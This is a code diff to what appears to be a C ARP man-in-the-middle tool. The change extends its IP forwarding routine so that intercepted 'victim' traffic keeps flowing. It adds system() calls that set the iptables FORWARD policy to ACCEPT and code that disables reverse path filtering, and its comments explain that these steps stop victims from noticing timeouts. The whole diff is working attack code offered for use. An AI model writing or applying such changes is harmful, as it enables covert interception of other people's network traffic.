@@ -83,6 +83,7 @@ unsigned char *get_netmask() {
 }
 
 int enable_ip_forwarding() {
+  // Enable kernel IP forwarding
   FILE *f = fopen("/proc/sys/net/ipv4/ip_forward", "w");
   if (f == NULL) {
     perror("Failed to open /proc/sys/net/ipv4/ip_forward");
@@ -90,6 +91,22 @@ int enable_ip_forwarding() {
   }
   fprintf(f, "1");
   fclose(f);
+
+  // Ensure iptables FORWARD chain accepts traffic.
+  // Many distros (especially Bookworm+) default FORWARD to DROP,
+  // which silently blocks all forwarded traffic → ERR_TIMED_OUT on victims.
+  system("iptables -P FORWARD ACCEPT 2>/dev/null || "
+         "/sbin/iptables -P FORWARD ACCEPT 2>/dev/null || "
+         "/usr/sbin/iptables -P FORWARD ACCEPT 2>/dev/null");
+
+  // Disable reverse path filtering on eth0.
+  // rp_filter can drop packets with "unexpected" source addresses,
+  // which happens in ARP MitM when victim packets arrive on our interface.
+  FILE *rp = fopen("/proc/sys/net/ipv4/conf/eth0/rp_filter", "w");
+  if (rp) { fprintf(rp, "0"); fclose(rp); }
+  rp = fopen("/proc/sys/net/ipv4/conf/all/rp_filter", "w");
+  if (rp) { fprintf(rp, "0"); fclose(rp); }
+
   return 0;
 }
 
